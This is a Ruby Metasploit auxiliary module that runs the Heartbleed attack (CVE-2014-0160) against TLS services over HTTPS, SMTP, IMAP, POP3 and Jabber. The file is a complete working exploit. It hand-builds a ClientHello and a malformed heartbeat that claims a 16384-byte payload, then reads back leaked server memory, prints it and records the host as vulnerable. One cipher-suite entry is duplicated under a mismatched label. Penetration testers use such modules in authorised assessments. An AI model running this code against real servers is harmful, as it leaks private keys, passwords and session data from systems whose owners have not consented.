##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::Tcp
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report

  CIPHER_SUITES = [
    0xc014, # TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA
    0xc00a, # TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA
    0xc022, # TLS_SRP_SHA_DSS_WITH_AES_256_CBC_SHA
    0xc021, # TLS_SRP_SHA_RSA_WITH_AES_256_CBC_SHA
    0x0039, # TLS_DHE_RSA_WITH_AES_256_CBC_SHA
    0x0038, # TLS_DHE_DSS_WITH_AES_256_CBC_SHA
    0x0088, # TLS_DHE_RSA_WITH_CAMELLIA_256_CBC_SHA
    0x0087, # TLS_DHE_DSS_WITH_CAMELLIA_256_CBC_SHA
    0x0087, # TLS_ECDH_RSA_WITH_AES_256_CBC_SHA
    0xc00f, # TLS_ECDH_ECDSA_WITH_AES_256_CBC_SHA
    0x0035, # TLS_RSA_WITH_AES_256_CBC_SHA
    0x0084, # TLS_RSA_WITH_CAMELLIA_256_CBC_SHA
    0xc012, # TLS_ECDHE_RSA_WITH_3DES_EDE_CBC_SHA
    0xc008, # TLS_ECDHE_ECDSA_WITH_3DES_EDE_CBC_SHA
    0xc01c, # TLS_SRP_SHA_DSS_WITH_3DES_EDE_CBC_SHA
    0xc01b, # TLS_SRP_SHA_RSA_WITH_3DES_EDE_CBC_SHA
    0x0016, # TLS_DHE_RSA_WITH_3DES_EDE_CBC_SHA
    0x0013, # TLS_DHE_DSS_WITH_3DES_EDE_CBC_SHA
    0xc00d, # TLS_ECDH_RSA_WITH_3DES_EDE_CBC_SHA
    0xc003, # TLS_ECDH_ECDSA_WITH_3DES_EDE_CBC_SHA
    0x000a, # TLS_RSA_WITH_3DES_EDE_CBC_SHA
    0xc013, # TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA
    0xc009, # TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA
    0xc01f, # TLS_SRP_SHA_DSS_WITH_AES_128_CBC_SHA
    0xc01e, # TLS_SRP_SHA_RSA_WITH_AES_128_CBC_SHA
    0x0033, # TLS_DHE_RSA_WITH_AES_128_CBC_SHA
    0x0032, # TLS_DHE_DSS_WITH_AES_128_CBC_SHA
    0x009a, # TLS_DHE_RSA_WITH_SEED_CBC_SHA
    0x0099, # TLS_DHE_DSS_WITH_SEED_CBC_SHA
    0x0045, # TLS_DHE_RSA_WITH_CAMELLIA_128_CBC_SHA
    0x0044, # TLS_DHE_DSS_WITH_CAMELLIA_128_CBC_SHA
    0xc00e, # TLS_ECDH_RSA_WITH_AES_128_CBC_SHA
    0xc004, # TLS_ECDH_ECDSA_WITH_AES_128_CBC_SHA
    0x002f, # TLS_RSA_WITH_AES_128_CBC_SHA
    0x0096, # TLS_RSA_WITH_SEED_CBC_SHA
    0x0041, # TLS_RSA_WITH_CAMELLIA_128_CBC_SHA
    0xc011, # TLS_ECDHE_RSA_WITH_RC4_128_SHA
    0xc007, # TLS_ECDHE_ECDSA_WITH_RC4_128_SHA
    0xc00c, # TLS_ECDH_RSA_WITH_RC4_128_SHA
    0xc002, # TLS_ECDH_ECDSA_WITH_RC4_128_SHA
    0x0005, # TLS_RSA_WITH_RC4_128_SHA
    0x0004, # TLS_RSA_WITH_RC4_128_MD5
    0x0015, # TLS_DHE_RSA_WITH_DES_CBC_SHA
    0x0012, # TLS_DHE_DSS_WITH_DES_CBC_SHA
    0x0009, # TLS_RSA_WITH_DES_CBC_SHA
    0x0014, # TLS_DHE_RSA_EXPORT_WITH_DES40_CBC_SHA
    0x0011, # TLS_DHE_DSS_EXPORT_WITH_DES40_CBC_SHA
    0x0008, # TLS_RSA_EXPORT_WITH_DES40_CBC_SHA
    0x0006, # TLS_RSA_EXPORT_WITH_RC2_CBC_40_MD5
    0x0003, # TLS_RSA_EXPORT_WITH_RC4_40_MD5
    0x00ff  # Unknown
  ]

  HANDSHAKE_RECORD_TYPE = 0x16
  HEARTBEAT_RECORD_TYPE = 0x18
  TLS_VERSION = 0x0302 # TLS 1.1

  def initialize
    super(
      'Name'        => 'SSL Heartbeat Information Leak',
      'Description' => %q{
        This module implements the SSL Heartbleed attack disclosed on April 2014. The problem
        exists in the handling of Hearbeat requests, where a fake length can be used to leak
        memory data in the response.
      },
      'Author'      => [
        'Jared Stafford <jspenguin[at]jspenguin.org', # Original Proof of Concept. This module is based on it.
        'FiloSottile', # PoC site and tool
        'Christian Mehlmauer <FireFart[at]gmail.com', # Msf module
        'juan vazquez',  #Msf module
        'wvu' # Msf module
      ],
      'References'  =>
        [
          'CVE', '2014-0160',
          'URL', 'http://heartbleed.com/',
          'URL', 'https://github.com/FiloSottile/Heartbleed',
          'URL', 'https://gist.github.com/takeshixx/10107280',
          'URL', 'http://filippo.io/Heartbleed/'
        ],
      'License'     => MSF_LICENSE,
    )

    register_options(
      [
        Opt::RPORT(443),
        OptEnum.new('PROTOCOL', [true, 'Protocol to use with SSL', 'WEB', [ 'WEB', 'SMTP', 'IMAP', 'JABBER', 'POP3' ]])
      ], self.class)
  end

  def peer
    "#{rhost}:#{rport}"
  end

  def tls_smtp
    sock.get_once
    sock.put("EHLO #{rand_text_alpha(10)}\n")
    res = sock.get_once
    unless res and res =~ /STARTTLS/i
      return nil
    end
    sock.put("STARTTLS\n")
    sock.get_once
  end

  def tls_imap
    sock.get_once
    sock.put("a001 CAPABILITY\r\n")
    res = sock.get_once
    unless res and res =~ /STARTTLS/i
      return nil
    end
    sock.put("a002 STARTTLS\r\n")
    sock.get_once
  end

  def tls_pop3
    sock.get_once
    sock.put("CAPA\r\n")
    res = sock.get_once
    if !res or res =~ /^-/
      return nil
    end
    sock.put("STLS\r\n")
    res = sock.get_once
    if !res or res =~ /^-/
      return nil
    end
  end

  def tls_jabber
    msg = "<?xml version='1.0' ?><stream:stream to='#{rhost}' "
    msg << "xmlns='jabber:client' "
    msg << "xmlns:stream='http://etherx.jabber.org/streams' version='1.0'>"
    sock.put(msg)
    res = sock.get_once
    return nil if res.nil? # SSL not supported
    return nil if res =~ /stream:error/ or res !~ /starttls/i
    msg = "<starttls xmlns='urn:ietf:params:xml:ns:xmpp-tls'/>"
    sock.put(msg)
    sock.get_once
  end

  def run_host(ip)
    connect

    case datastore['PROTOCOL']
      when "WEB"
        # no STARTTLS needed
      when "SMTP"
        print_status("Trying to start SSL via SMTP")
        res = tls_smtp
        if res.nil?
          print_error("#{peer} - STARTTLS failed...")
          return
        end
      when "IMAP"
        print_status("Trying to start SSL via IMAP")
        res = tls_imap
        if res.nil?
          print_error("#{peer} - STARTTLS failed...")
          return
        end
      when "JABBER"
        print_status("Trying to start SSL via JABBER")
        res = tls_jabber
        if res.nil?
          print_error("#{peer} - STARTTLS failed...")
          return
        end
      when "POP3"
        print_status("Trying to start SSL via POP3")
        res = tls_pop3
        if res.nil?
          print_error("#{peer} - STARTTLS failed...")
          return
        end
      else
        print_error("Unknown protocol #{datastore['PROTOCOL']}")
        return
    end

    print_status("#{peer} - Sending Client Hello...")
    sock.put(client_hello)

    server_hello = sock.get
    unless server_hello.unpack("C").first == HANDSHAKE_RECORD_TYPE
      print_error("#{peer} - Server Hello Not Found")
      return
    end

    print_status("#{peer} - Sending Heartbeat...")
    sock.put(heartbeat)
    hdr = sock.get_once(5)
    if hdr.blank?
      print_error("#{peer} - No Heartbeat response...")
      return
    end

    unpacked = hdr.unpack('CnC')
    type = unpacked[0]
    version = unpacked[1] # must match the type from client_hello
    len = unpacked[2]

    unless type == HEARTBEAT_RECORD_TYPE and version == TLS_VERSION
      print_error("#{peer} - Unexpected Heartbeat response'")
      disconnect
      return
    end

    print_status("#{peer} - Heartbeat response, checking if there is data leaked...")
    heartbeat_data = sock.get_once(16384) # Read the magic length...
    if heartbeat_data and heartbeat_data.length > len
      print_status("#{peer} - Heartbeat response with leak...")
      report_vuln({
        :host => rhost,
        :port => rport,
        :name => self.name,
        :refs => self.references,
        :info => "Module #{self.fullname} successfully leaked info"
      })
      print_status("#{peer} - Printable info leaked: #{heartbeat_data.gsub(/[^[:print:]]/, '')}")
    else
      print_error("#{peer} - Looks like there isn't leaked information...")
    end
  end

  def heartbeat
    payload = "\x01"      # Heartbeat Message Type: Request (1)
    payload << "\x40\x00" # Payload Length: 16384

    ssl_record(HEARTBEAT_RECORD_TYPE, payload)
  end

  def client_hello
    data = "\x01"                   # Handshake Type: Client Hello (1)
    data << "\x00\x00\xd8"           # Length: 216
    data << "\x03\x02"               # Version TLS 1.1
    data << Rex::Text.rand_text(32)  # Random
    data << "\x00"                   # Session ID length
    data << [CIPHER_SUITES.length * 2].pack("n") # Cipher Suites length (102)
    data << CIPHER_SUITES.pack("n*") # Cipher Suites
    data << "\x01"                   # Compression methods length (1)
    data << "\x00"                   # Compression methods: null
    data << "\x00\x49"               # Extensions length (73)
    data << "\x00\x0b"               # Extension type (ec_point_formats)
    data << "\x00\x04"               # Extension length
    data << "\x03\x00\x01\x02"       # Extension data
    data << "\x00\x0a"               # Extension type (elliptic curves)
    data << "\x00\x34"               # Extension length
    data << "\x00\x32\x00\x0e\x00\x0d\x00\x19\x00\x0b\x00\x0c\x00\x18\x00\x09\x00\x0a\x00\x16\x00\x17\x00\x08\x00\x06\x00\x07\x00\x14\x00\x15\x00\x04\x00\x05\x00\x12\x00\x13\x00\x01\x00\x02\x00\x03\x00\x0f\x00\x10\x00\x11" # Extension data
    data << "\x00\x23"               # Extension type (Sessionticket TLS)
    data << "\x00\x00"               # Extension length
    data << "\x00\x0f"               # Extension type (Heartbeat)
    data << "\x00\x01"               # Extension length
    data << "\x01"                   # Extension data

    ssl_record(HANDSHAKE_RECORD_TYPE, data)
  end

  def ssl_record(type, data)
    record = [type, TLS_VERSION, data.length].pack('Cnn')
    record << data
  end
end
